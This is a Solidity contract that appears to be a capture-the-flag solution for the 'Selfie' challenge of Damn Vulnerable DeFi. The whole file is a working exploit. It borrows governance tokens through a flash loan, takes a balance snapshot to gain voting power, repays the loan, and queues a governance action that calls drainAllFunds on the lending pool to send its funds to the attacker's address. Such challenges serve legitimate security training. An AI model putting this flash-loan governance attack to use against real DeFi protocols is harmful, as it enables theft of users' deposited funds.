pragma solidity ^0.6.0;

import "../selfie/SelfiePool.sol";
import "../selfie/SimpleGovernance.sol";
import "../DamnValuableTokenSnapshot.sol";

contract AttackerSelfie {

    SelfiePool public pool;
    SimpleGovernance public governance;

    uint256 public actionId;

    constructor(address poolAddress,
    address governanceAddress
    ) public {
        pool = SelfiePool(poolAddress);
        governance = SimpleGovernance(governanceAddress);
    }

    function receiveTokens(DamnValuableTokenSnapshot token, uint256 amount) public {

        // Take balance snapshot
        token.snapshot();

        // Return the flash loan
        token.transfer(msg.sender, amount);

        // Queue governance action
        actionId = governance.queueAction(
                    address(pool), 
                    abi.encodeWithSignature(
                        "drainAllFunds(address)",
                        tx.origin
                    ),
                    0
        );

    }

    function attack(uint256 amount) public {

        // Initiate the flash loan and trigger receiveFlashLoan()
        pool.flashLoan(amount);
    }
}